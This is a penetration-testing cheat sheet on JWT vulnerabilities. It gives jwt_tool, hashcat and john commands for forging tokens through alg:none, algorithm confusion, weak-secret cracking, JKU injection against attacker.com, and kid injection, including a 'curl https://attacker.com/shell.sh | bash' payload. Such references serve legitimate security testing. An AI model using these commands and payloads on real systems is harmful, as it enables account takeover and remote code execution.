# JWT Vulnerabilities

## TL;DR

JWT attacks exploit weak signature validation, algorithm confusion, and secret brute-forcing to forge tokens.

```bash
# Test all attacks at once
python3 jwt_tool.py -M at -t "https://target.com/api/user" \
  -rh "Authorization: Bearer eyJhbG..."
```

---

## JWT Structure

```
header.payload.signature (Base64url encoded)

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

**Common Locations:**
- `Authorization: Bearer <JWT>`
- `Cookie: session=<JWT>`
- `X-Auth-Token: <JWT>`
- URL parameter: `?token=<JWT>`

---

## Exploitation

### 1. Signature Not Verified

Modify payload, keep same signature:

```bash
# If accepted, signature not checked
python3 jwt_tool.py <JWT> -I -pc user -pv admin
```

### 2. None Algorithm Attack

```bash
python3 jwt_tool.py <JWT> -X a
```

**Manual:**
```json
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
```

Remove signature:
```
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 3. Algorithm Confusion (RS256 → HS256)

Server expects RS256 (asymmetric), we trick it to use HS256 with public key as secret.

```bash
# Get public key
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pub.pem

# Sign with public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk pub.pem
```

### 4. Weak Secret Brute Force

```bash
# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat (faster)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# john
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**Once cracked:**
```bash
python3 jwt_tool.py <JWT> -S hs256 -p "cracked_secret" -pc user -pv admin
```

### 5. JWK Header Injection

Embed attacker's key in token:

```bash
python3 jwt_tool.py <JWT> -X i
```

### 6. JKU/X5U Header Injection

Host malicious JWKS:

```bash
# Generate key pair
python3 jwt_tool.py -V -js JWKS

# Host at attacker server
# Modify jku in token
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json
```

### 7. Kid Parameter Injection

**Path traversal:**
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**SQL injection:**
```json
{"kid": "key1' UNION SELECT 'attacker_secret' --"}
```

**Command injection:**
```json
{"kid": "/dev/null; curl https://attacker.com/shell.sh | bash"}
```

### 8. Expiration Bypass

```bash
# Set exp to far future
python3 jwt_tool.py <JWT> -S hs256 -p "secret" -pc exp -pv 9999999999
```

### 9. Cross-Service Token Reuse

```http
# Token from service-a used on service-b
GET https://service-b.target.com/api/user
Authorization: Bearer <TOKEN_FROM_SERVICE_A>
```

---

## Key Claims to Check

```json
{
  "alg": "HS256",     // Algorithm - can be manipulated
  "typ": "JWT",
  "kid": "key-id",    // Key identifier - injection target
  "jku": "https://...", // JWK Set URL - can point to attacker
  "x5u": "https://..."  // X.509 cert URL - can point to attacker
}
```

**Payload claims:**
```json
{
  "sub": "1234567890",  // Subject (user ID)
  "name": "John Doe",
  "admin": false,       // Privilege - try changing
  "iat": 1516239022,
  "exp": 1516242622     // Expiration
}
```

---

## Checklist

- [ ] Decode token, identify sensitive claims
- [ ] Modify payload, test if signature validated
- [ ] Try alg:none attack
- [ ] If RS256, try algorithm confusion
- [ ] Brute force HMAC secret
- [ ] Test JWK/JKU/X5U injection
- [ ] Check kid parameter for injection
- [ ] Test token expiration enforcement
- [ ] Look for cross-service token reuse
- [ ] Search for secrets in JS bundles/configs

---

## Tools

- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** — All-in-one JWT testing
- **[Burp JWT Editor](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)** — Visual manipulation
- **[jwt.io](https://jwt.io)** — Online decoder
- **hashcat** — GPU secret cracking
